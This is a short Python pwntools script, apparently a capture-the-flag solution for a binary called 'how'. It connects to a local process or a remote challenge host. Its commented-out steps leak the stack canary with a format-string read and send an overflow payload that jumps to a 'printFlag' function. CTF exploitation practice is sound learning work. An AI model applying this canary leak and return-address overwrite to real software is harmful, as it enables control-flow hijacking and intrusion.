from pwn import *
from pwn import p32

local = True

exe = context.binary = ELF("./how")
win = exe.symbols["printFlag"]
print(f"{hex(win)=}")

if local:
    p = process("./how")
else:
    host, port = "103.181.183.216", 17000
    p = remote(host, port)


# p.recvuntil(b"> ")
# p.sendline("%11$lx".encode())

# canary = int(p.recvline().decode().strip(), 16)
# print(f"{hex(canary)=}")

# payload = b"A" * 40 + p64(canary) + b"A" * 8 + p64(win)
# print(f"{payload=}")

# p.recvuntil(b"> ")
# p.sendline(payload)

p.interactive()
